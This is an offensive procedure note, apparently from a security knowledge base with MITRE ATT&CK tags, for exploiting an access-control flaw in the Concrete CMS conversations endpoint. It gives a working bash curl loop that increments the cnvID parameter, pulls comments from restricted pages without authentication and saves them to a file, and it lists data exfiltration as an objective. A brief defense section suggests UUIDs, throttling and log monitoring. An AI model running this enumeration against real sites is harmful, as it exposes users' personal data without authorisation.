---
tags:
  - enumeration
  - brute-force
  - idor
  - concrete-cms
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-post-conversations-view]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:29.610Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: cd333555-0c5c-4686-b138-3c71a9aa0ffd
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
---
# Enumerate-Comments-by-Brute-Forcing-cnvID

## Summary

This procedure brute-forces the cnvID parameter in the Concrete CMS conversations endpoint to enumerate and disclose comments from all conversations, including those on restricted pages, enabling mass PII extraction.

## Description

Due to the absence of access controls, incrementing integer values for cnvID in sequential POST requests to /index.php/tools/required/conversations/view_ajax allows an unauthenticated attacker to systematically retrieve all comments. Starting from cnvID=1 and incrementing (e.g., up to 1000 or until errors), this reveals sensitive data from administrator-only posts. In a production environment, this could expose thousands of comments with PII. Automation via scripting enhances efficiency.

## Requirements

1. Network access to the vulnerable endpoint
2. Scripting capability (e.g., bash loop) or manual testing tool
3. Tolerance for potential rate-limiting or logging

## Defense

Defensive measures and detection strategies:

- Add sequential ID obfuscation or UUIDs instead of incremental integers for object references
- Implement CAPTCHA or IP-based throttling on high-volume requests to the endpoint
- Monitor for patterns of sequential parameter increments in access logs

## Objectives

1. Enumerate multiple conversation objects beyond authorized access
2. Collect sensitive comments for analysis or exfiltration
3. Assess the full scope of data exposure

## Instructions

### Step 1: Initialize Enumeration Script

**Context**: Prepare a loop to send requests for cnvID values from 1 to a reasonable upper limit (e.g., 100).

Create a script or use a bash for-loop to automate.

### Step 2: Execute Brute-Force Requests

**Context**: Send POST requests with incrementing cnvID and capture responses.

**Command** ([[commands/curl-post-conversations-view]]):
```bash
for i in {1..100}; do curl -X POST 'http://target.com/index.php/tools/required/conversations/view_ajax' -d "cnvID=$i" >> enumerated_comments.txt; echo "--- cnvID $i ---" >> enumerated_comments.txt; done
```

> This loops through cnvID=1 to 100, appending responses to a file. Expected output per request is comment data; filter for successful responses (non-empty or HTTP 200).

**Expected Output**: File with concatenated responses, many containing comment PII from restricted sources.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-conversations-view]]

## Tools Used


## Tags

- [[enumeration]]
- [[brute-force]]
- [[idor]]
- [[concrete-cms]]
